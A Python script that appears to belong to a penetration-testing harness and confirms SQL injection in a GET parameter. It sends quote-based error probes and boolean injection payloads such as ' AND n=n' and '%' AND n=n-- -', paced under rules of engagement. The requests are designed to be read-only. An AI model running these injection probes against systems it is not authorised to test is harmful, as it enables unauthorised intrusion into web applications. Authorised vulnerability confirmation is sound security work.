#!/usr/bin/env python3
"""
sqli-confirm.py — the SQL injection oracle (Grimnir confirmation harness).

Two in-band proofs against one GET query parameter, no sqlmap, a handful of requests:

  error    The value plus one quote makes a database error appear that the baseline doesn't carry,
           and the value plus the same quote doubled (a balanced, escaped literal) makes it go away.
           Only a quote landing inside a SQL string literal behaves that way.
  boolean  Appending a TRUE condition (numeric, string literal, or LIKE pattern) leaves the response
           as the baseline; a FALSE one changes it; and the same TRUE condition with its keyword
           misspelled changes it too (so the app is not just ignoring trailing text). A second
           round with fresh literals must agree.

  sqli-confirm.py --finding-id SPE-008 --project-dir ~/workspace/prog \
     --method GET --url 'https://host/items?id=42' --param id [-H 'Name: value']...

Read-only by construction: conditions are ANDed onto the existing predicate (never OR, never a
stacked statement, never a time delay), so the worst a TRUE condition does is what the original
request did, and a FALSE one matches fewer rows. Time-based checks are a human follow-up.

Responses are compared by token overlap after removing the injected text (a reflected payload
would otherwise make every response differ). The baseline is fetched twice: its self-similarity is
the noise floor, and a page that changes on its own disables the boolean proof instead of feeding it.

Verdicts (evidence/<id>/verdict.json, the file validate-finding.sh's evidence gate reads for sqli):
  confirmed     the quote-balance pair, or two agreeing boolean rounds with the misspelled control
  sqli-likely   a database error that the balanced quote doesn't clear, or one boolean round that
                did not reproduce or whose misspelled control matched the baseline
  negative      stable baseline, no database error, no boolean differential
  inconclusive  transport failure, every injected request blocked, or an unstable baseline with no
                error signal: nothing is ruled out
"""
import argparse
import html
import json
import os
import re
import secrets
import string
import sys
from collections import Counter
from datetime import datetime, timezone
from urllib.parse import parse_qsl, quote, quote_plus, urlsplit

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import _pace  # noqa: E402  RoE pacing around every live request (sibling module; puts scripts/ on the path)
import params as _params  # noqa: E402  the probe's fetch: no redirects, capped body, browser UA
import egress as _egress  # noqa: E402  the program's egress proxy (params.fetch honors it)

# (dbms, pattern). Error text a database driver or ORM emits for a syntax error. Only counted as a
# differential against the baseline, so a page that always prints one never counts.
_DB_ERRORS = (
    ("mysql", r"You have an error in your SQL syntax|Warning: mysqli?_|MySqlException|"
              r"check the manual that corresponds to your (?:MySQL|MariaDB) server version"),
    ("postgresql", r"PG::\w*Error|PSQLException|org\.postgresql\.util|unterminated quoted string at or near|"
                   r"syntax error at or near \""),
    ("mssql", r"Unclosed quotation mark after the character string|Microsoft OLE DB Provider for SQL Server|"
              r"System\.Data\.SqlClient\.SqlException|Incorrect syntax near"),
    ("oracle", r"\bORA-\d{5}\b|quoted string not properly terminated"),
    ("sqlite", r"SQLite3::|sqlite3\.OperationalError|SQLITE_ERROR|unrecognized token: \""),
    ("db2", r"DB2 SQL error|SQLCODE=-\d+"),
    ("access", r"Syntax error in string in query expression|Microsoft JET Database Engine"),
    ("generic", r"SQLSTATE\[|\bjava\.sql\.SQL\w*Exception|org\.hibernate\.exception|"
                r"SequelizeDatabaseError|ActiveRecord::StatementInvalid|django\.db\.utils\."),
)
DB_ERROR_PATTERNS = [(n, re.compile(r)) for n, r in _DB_ERRORS]

MIN_STABILITY = 0.9   # a baseline less similar to itself than this is too dynamic for the boolean proof
SAME_SLACK = 0.02     # within the noise floor: the response is the baseline
DIFF_MARGIN = 0.1     # this far below the noise floor (or a status change): the response differs


def current_value(url: str, name: str) -> str:
    return next((v for k, v in parse_qsl(urlsplit(url).query, keep_blank_values=True) if k == name), "")


def db_errors(text: str) -> list[str]:
    return [name for name, rx in DB_ERROR_PATTERNS if rx.search(text or "")]


def _variants(s: str) -> set[str]:
    """The forms a reflected suffix can come back in."""
    return {v for v in (s, html.escape(s), html.escape(s, quote=False), quote(s), quote_plus(s),
                        json.dumps(s)[1:-1]) if v}


def tokens(body: str, strip: str = "") -> Counter:
    for v in sorted(_variants(strip), key=len, reverse=True) if strip else ():
        body = body.replace(v, "")
    return Counter(t for t in re.split(r"[\n>,]+", body) if t.strip())


def similarity(a: Counter, b: Counter) -> float:
    total = sum(a.values()) + sum(b.values())
    return 1.0 if total == 0 else 2 * sum((a & b).values()) / total


def _letters(n: int = 2) -> list[str]:
    return secrets.SystemRandom().sample(string.ascii_lowercase, n)


def boolean_payloads(context: str) -> dict:
    """{true, false, junk} suffixes for one context, with fresh literals each call."""
    if context == "numeric":
        n = 11 + secrets.randbelow(80)
        return {"true": f" AND {n}={n}", "false": f" AND {n}={n + 1}", "junk": f" ANX {n}={n}"}
    if context == "string-like":
        # Inside LIKE '%v%': keep the wildcard so TRUE still matches what the baseline matched, and
        # comment out the closing %' the template appends.
        n = 11 + secrets.randbelow(80)
        return {"true": f"%' AND {n}={n}-- -", "false": f"%' AND {n}={n + 1}-- -", "junk": f"%' ANX {n}={n}-- -"}
    a, b = _letters()
    return {"true": f"' AND '{a}'='{a}", "false": f"' AND '{a}'='{b}", "junk": f"' ANX '{a}'='{a}"}


def probe_sqli(get, url: str, param: str) -> dict:
    """The whole oracle against one parameter. `get(url) -> {status, body, headers}` sends one paced
    GET. Returns the evidence record minus the run metadata."""
    out: dict = {"requests": 0, "error_probe": [], "boolean": [], "dbms": None}
    orig = current_value(url, param)

    def send(suffix):
        out["requests"] += 1
        u = _params.with_param(url, param, orig + suffix)
        r = get(u)
        return r, u

    b1, _ = send("")
    b2, _ = send("")
    if not b1.get("status") or not b2.get("status"):
        return {**out, "verdict": "inconclusive", "why": "baseline request failed (transport error)"}
    base_tokens = tokens(b1.get("body") or "")
    stability = similarity(base_tokens, tokens(b2.get("body") or ""))
    stable = stability >= MIN_STABILITY and b1["status"] == b2["status"]
    site_errors = set(db_errors(b1.get("body") or "")) | set(db_errors(b2.get("body") or ""))
    out["baseline"] = {"status": b1["status"], "length": len(b1.get("body") or ""),
                       "stability": round(stability, 4), "stable": stable}

    def compare(resp, suffix) -> str:
        if resp.get("status") != b1["status"]:
            return "differs"
        s = similarity(base_tokens, tokens(resp.get("body") or "", suffix))
        if s >= stability - SAME_SLACK:
            return "same"
        return "differs" if s < stability - DIFF_MARGIN else "unclear"

    blocked, error_hit = 0, None
    # 1. error: one quote breaks a literal, the doubled quote heals it.
    for q in ("'", '"'):
        r1, u1 = send(q)
        if not r1.get("status"):
            return {**out, "verdict": "inconclusive", "why": "injected request failed (transport error)"}
        blocked += r1["status"] != b1["status"]
        errs = [e for e in db_errors(r1.get("body") or "") if e not in site_errors]
        rec = {"suffix": q, "status": r1["status"], "errors": errs}
        out["error_probe"].append(rec)
        if not errs:
            continue
        r2, _ = send(q + q)
        healed = not [e for e in db_errors(r2.get("body") or "") if e not in site_errors]
        rec.update(balanced_status=r2.get("status", 0), healed=healed, poc_url=u1)
        named = [e for e in errs if e != "generic"]
        out["dbms"] = named[0] if named else "unknown"
        if healed:
            return {**out, "verdict": "confirmed",
                    "why": f"a {q} quote raised a database error ({', '.join(errs)}) that the baseline "
                           f"lacks, and the doubled quote cleared it: the value lands in a SQL literal"}
        error_hit = (q, errs)
        break   # a numeric context errors on both; the boolean proof decides it

    def unproven(why_more: str) -> dict:
        q, errs = error_hit
        return {**out, "verdict": "sqli-likely",
                "why": f"a {q} quote raised a database error ({', '.join(errs)}) that the doubled quote "
                       f"did not clear{why_more}"}

    if not stable:
        if error_hit:
            return unproven(", and the baseline is too unstable for the boolean proof")
        return {**out, "verdict": "inconclusive",
                "why": f"no database error, and the baseline changes on its own (self-similarity "
                       f"{stability:.2f}), so the boolean proof can't be read"}

    # 2. boolean: TRUE matches the baseline, FALSE and misspelled-TRUE don't, twice.
    contexts = (["numeric"] if re.fullmatch(r"-?\d+", orig) else []) + ["string", "string-like"]
    first_hit = None
    for ctx in contexts:
        p = boolean_payloads(ctx)
        rt, _ = send(p["true"])
        rf, _ = send(p["false"])
        res = {"context": ctx, "true": compare(rt, p["true"]), "false": compare(rf, p["false"])}
        blocked += (rt.get("status") != b1["status"]) + (rf.get("status") != b1["status"])
        if res["true"] == "same" and res["false"] == "differs":
            rj, _ = send(p["junk"])
            res["junk"] = compare(rj, p["junk"])
            p2 = boolean_payloads(ctx)
            rt2, ut2 = send(p2["true"])
            rf2, uf2 = send(p2["false"])
            res["repeat"] = {"true": compare(rt2, p2["true"]), "false": compare(rf2, p2["false"])}
            res["poc"] = {"true_url": ut2, "false_url": uf2}
            out["boolean"].append(res)
            repeated = res["repeat"] == {"true": "same", "false": "differs"}
            if repeated and res["junk"] == "differs":
                return {**out, "verdict": "confirmed",
                        "why": f"{ctx} boolean pair: TRUE kept the baseline and FALSE changed it in two "
                               f"rounds with fresh literals, and a misspelled TRUE changed it too"}
            first_hit = first_hit or (ctx, repeated, res["junk"])
            continue
        out["boolean"].append(res)

    if error_hit:
        return unproven(" and no boolean pair confirmed it")
    if first_hit:
        ctx, repeated, junk = first_hit
        why = ("the misspelled TRUE kept the baseline as well, so the app may ignore trailing text"
               if repeated else "the second round with fresh literals did not reproduce it")
        return {**out, "verdict": "sqli-likely", "why": f"{ctx} boolean pair differed once, but {why}"}
    injected = out["requests"] - 2
    if injected and blocked >= injected:
        return {**out, "verdict": "inconclusive",
                "why": f"every injected request came back with a different status than the baseline "
                       f"({b1['status']}): blocked or rejected, not tested"}
    return {**out, "verdict": "negative",
            "why": "stable baseline; no database error on either quote and no boolean differential"}


def main() -> int:
    ap = argparse.ArgumentParser(prog="sqli-confirm.py")
    ap.add_argument("--finding-id", required=True)
    ap.add_argument("--project-dir", required=True)
    ap.add_argument("--method", default="GET")
    ap.add_argument("--url", required=True, help="a concrete URL that carries the parameter's real value")
    ap.add_argument("--param", required=True, help="the query parameter to inject")
    ap.add_argument("-H", "--header", action="append", default=[], dest="headers")
    ap.add_argument("--timeout", type=float, default=20.0)
    a = ap.parse_args()
    if a.method.upper() != "GET":
        print("sqli-confirm.py probes GET query parameters only (read-only)", file=sys.stderr)
        return 2
    _pace.init(a.project_dir)
    _egress.init(a.project_dir)   # roe.json's proxy applies to a CLI run, not just a lane's env

    def get(u):
        _pace.before(u)
        r = _params.fetch(u, a.headers, a.timeout)
        if r.get("status"):
            _pace.after(u, r["status"])
        return r

    res = probe_sqli(get, a.url, a.param)
    rec = {"schema": 1, "finding_id": a.finding_id, "vuln_class": "sqli",
           "ts": datetime.now(timezone.utc).isoformat(), "url": a.url, "param": a.param, **res,
           "negative_control": ("quote-balance pair (one quote vs the doubled quote) and a boolean "
                                f"pair with a misspelled-keyword control, against a twice-fetched baseline: {res['why']}")}
    d = os.path.join(a.project_dir, "evidence", a.finding_id)
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "verdict.json"), "w") as fh:
        json.dump(rec, fh, indent=2)
    print(json.dumps({k: rec[k] for k in ("finding_id", "verdict", "why")}, indent=2))
    print(f"wrote {d}/verdict.json ({res['requests']} requests)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
